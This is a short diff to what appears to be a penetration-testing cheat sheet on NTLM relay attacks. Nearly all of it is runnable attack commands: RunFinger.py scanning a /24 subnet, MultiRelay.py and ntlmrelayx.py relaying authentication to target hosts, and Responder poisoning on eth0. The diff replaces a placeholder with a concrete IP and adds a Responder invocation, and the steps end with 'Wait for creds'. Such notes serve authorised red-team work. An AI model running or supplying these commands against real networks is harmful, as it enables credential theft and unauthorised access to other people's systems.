@@ -15,7 +15,7 @@ python RunFinger.py -i 192.168.0.0/24
 echo "IP"  >> targets.txt
  ```   
  ```
- python MultiRelay.py -t <target_machine_IP> -u ALL -d
+ python MultiRelay.py -t 192.168.0.4 -u ALL -d
  ntlmrelayx.py -tf targets.txt --smb2support
  ```
 3. Disable SMB and HTTP response poisoning in Responder and launch
@@ -27,6 +27,7 @@ gedit Responder.conf
 ```
 4. Open the Responder.conf file and set the value of SMB and HTTP to Off
 ```
+Responder.py** -I eth0 -rv
 Responder.py** -I eth0 -rdw
 ```
 5. Wait for creds
